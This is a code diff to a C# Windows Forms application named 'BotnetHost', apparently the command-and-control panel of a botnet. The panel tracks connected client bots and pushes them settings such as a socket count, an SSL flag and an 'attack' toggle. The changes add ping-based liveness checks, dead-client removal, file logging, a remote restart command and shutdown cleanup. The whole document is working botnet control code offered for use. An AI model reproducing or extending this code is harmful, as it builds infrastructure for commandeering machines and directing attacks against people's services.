@@ -7,6 +7,7 @@ using System.Net.Sockets;
 using System.Text;
 using System.Windows.Forms;
 using System.Threading;
+using System.IO;
 
 namespace BotnetHost
 {
@@ -21,6 +22,7 @@ namespace BotnetHost
         // Action Variables
         Boolean runServer = false;
         string previousLogMessage = "";
+        Boolean restartClients = false;
 
 
 
@@ -59,10 +61,17 @@ namespace BotnetHost
                 {
                     if (connection.guid.ToString() == clientGUID)
                     {
-                        // matching GUID found, this is our desired connection
-                        clientConnection = connection;
-                        clientSocket = clientConnection.clientSocket;
-                        clientName = clientSocket.RemoteEndPoint.ToString();
+                        try
+                        {
+                            // matching GUID found, this is our desired connection
+                            clientConnection = connection;
+                            clientSocket = clientConnection.clientSocket;
+                            clientName = clientSocket.RemoteEndPoint.ToString();
+                        } catch (Exception e)
+                        {
+                            runThread = false;
+                            break;
+                        }
                     }
                 }
                 Boolean hasUpdate = false;
@@ -127,8 +136,14 @@ namespace BotnetHost
                     // Send update message to client (if update is present)
                     if (hasUpdate)
                     {
-                        log("Sending Client Update: " + clientConnection.buildUpdate());
-                        byte[] message = Encoding.ASCII.GetBytes(clientConnection.buildUpdate());
+                        log("Sending Client Update: " + clientConnection.buildUpdate(new string[0]));
+                        byte[] message = Encoding.ASCII.GetBytes(clientConnection.buildUpdate(new string[0]));
+                        clientSocket.Send(message);
+                        clientConnection.restart = false;
+                    } else
+                    {
+                        log("Pinging client(s)... ");
+                        byte[] message = Encoding.ASCII.GetBytes("ping!");
                         clientSocket.Send(message);
                     }
 
@@ -139,6 +154,7 @@ namespace BotnetHost
                 {
                     log("Connection with " + clientName + " has been interrupted... killing client...");
                     clientConnection.killClient();
+                    clientConnections.Remove(clientConnection);
                     runThread = false;
                     updateClientPanel();
                 }
@@ -190,11 +206,16 @@ namespace BotnetHost
                         // Loop through active connections to check for dead clients
                         foreach (ClientConnection connection in clientConnections)
                         {
-                            if (!connection.clientSocket.Connected)
+                            try
                             {
-                                string connectionName = connection.clientSocket.RemoteEndPoint.ToString();
-                                log("Killing " + connectionName);
+                                byte[] message = Encoding.ASCII.GetBytes("ping!");
+                                connection.clientSocket.Send(message);
+                            } catch (Exception e)
+                            {
+                                log("Connection with " + connection.clientName + " has been interrupted... killing client...");
                                 connection.killClient();
+                                clientConnections.Remove(connection);
+                                updateClientPanel();
                             }
                         }
                     } catch (Exception error)
@@ -245,11 +266,19 @@ namespace BotnetHost
                     // ughhhhhhhhhhhhh something broke
                     Console.WriteLine("HEY SILLY, THIS IS PREVENTING THE LOG FROM WORKING: " + e.ToString());
                 }
+                try
+                {
+                    File.AppendAllText("log.txt", logMessage + Environment.NewLine);
+                }
+                catch (Exception e)
+                {
+                    log(e.ToString());
+                }
             }
         }
 
         /// <summary>
-        /// updateClientPanel(), used to keep an updated list of active clients (this needs a lot of work, as it barely works)
+        /// updateClientPanel(), used to keep an updated list of active clients
         /// </summary>
         public void updateClientPanel()
         {
@@ -261,13 +290,16 @@ namespace BotnetHost
             {
                 try
                 {
-                    ListViewItem clientItem = new ListViewItem();
-                    clientItem.Text = item.clientSocket.RemoteEndPoint.ToString();
-                    // Add tile to main panel
-                    clientListView.Invoke((MethodInvoker)delegate {
-                        // Running on the UI thread
-                        clientListView.Items.Add(clientItem);
-                    });
+                    if (item.isAlive)
+                    {
+                        ListViewItem clientItem = new ListViewItem();
+                        clientItem.Text = item.clientSocket.RemoteEndPoint.ToString();
+                        // Add tile to main panel
+                        clientListView.Invoke((MethodInvoker)delegate {
+                            // Running on the UI thread
+                            clientListView.Items.Add(clientItem);
+                        });
+                    }
                 } catch (Exception e)
                 {
 
@@ -293,6 +325,7 @@ namespace BotnetHost
                 clientConnection.sockets = socketsTrackBar.Value;
                 clientConnection.useSSL = useSSLToggle.Checked;
                 clientConnection.attack = attackingToggle.Checked;
+                clientConnection.restart = restartClients;
             }
             updateStatusLabel.Text = "True";
         }
@@ -375,9 +408,47 @@ namespace BotnetHost
             }
         }
 
-        private void updateTrackBars(object sender, ScrollEventArgs e)
+        /// <summary>
+        /// Closing Procedure, cleans up all connections/threads/sockets
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
+        private void MainPanel_FormClosing(object sender, FormClosingEventArgs e)
         {
+            // Kill all client connections
+            foreach (ClientConnection connection in clientConnections)
+            {
+                connection.killClient();
+            }
+            // Shutdown & Close Server Socket
+            try
+            {
+                serverSocket.Shutdown(SocketShutdown.Both);
+            }
+            catch (Exception er) { }
+            try
+            {
+                serverSocket.Close();
+            }
+            catch (Exception er) { }
+            // Abort main thread
+            try
+            {
+                mainServerThread.Abort();
+            }
+            catch (Exception er) { }
+        }
 
+        /// <summary>
+        /// Restart client button
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
+        private void restartClientsBtn_Click(object sender, EventArgs e)
+        {
+            restartClients = true;
+            settingsChanged(sender, e);
+            restartClients = false;
         }
     }
 }
